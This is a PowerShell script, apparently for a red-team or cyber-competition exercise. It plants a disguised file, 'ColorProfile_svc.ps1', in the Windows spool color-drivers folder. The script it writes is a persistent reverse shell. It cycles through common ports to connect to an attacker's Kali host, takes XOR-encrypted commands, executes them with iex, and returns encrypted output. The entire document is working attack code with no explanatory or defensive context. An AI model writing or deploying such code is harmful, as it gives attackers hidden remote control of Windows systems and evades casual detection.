$dir = "C:\Windows\System32\spool\drivers\color"

$payload = @'
$ports  = @(80, 443, 8080, 3306, 4444, 5985, 8443)
$ip     = "YOUR_KALI_IP"
$xorKey = "CDTC0ldW4r$2026!xK"

function XorCrypt([byte[]]$data, [string]$key) {
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $out
}

function ReadExact([System.Net.Sockets.NetworkStream]$stream, [int]$count) {
    # Reads exactly $count bytes — no more, no less
    $buf = New-Object byte[] $count
    $total = 0
    while ($total -lt $count) {
        $read = $stream.Read($buf, $total, $count - $total)
        if ($read -eq 0) { return $null }
        $total += $read
    }
    return $buf
}

while ($true) {
    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()

            while ($true) {
                # Read 4-byte length header
                $lenBytes = ReadExact $stream 4
                if ($lenBytes -eq $null) { break }

                # Convert to int (big-endian)
                [Array]::Reverse($lenBytes)
                $msgLen = [BitConverter]::ToUInt32($lenBytes, 0)

                # Read exactly msgLen bytes
                $encoded = ReadExact $stream $msgLen
                if ($encoded -eq $null) { break }

                # Decode and execute
                $decoded  = XorCrypt $encoded $xorKey
                $command  = [System.Text.Encoding]::UTF8.GetString($decoded).Trim()
                $output   = (iex $command 2>&1 | Out-String)
                $prompt   = "PS " + (Get-Location).Path + "> "
                $response = [System.Text.Encoding]::UTF8.GetBytes($output + $prompt)

                # XOR encode response
                $encResp  = XorCrypt $response $xorKey

                # Send 4-byte length prefix + encoded response
                $respLen  = [BitConverter]::GetBytes([uint32]$encResp.Length)
                [Array]::Reverse($respLen)
                $stream.Write($respLen, 0, 4)
                $stream.Write($encResp, 0, $encResp.Length)
                $stream.Flush()
            }
            $client.Close()
        } catch {
            Start-Sleep -Seconds 5
        }
    }
    Start-Sleep -Seconds 15
}
'@

$payload | Out-File -FilePath "$dir\ColorProfile_svc.ps1" -Encoding ASCII
Write-Host "[+] Payload written. Verifying..."
Get-Content "$dir\ColorProfile_svc.ps1"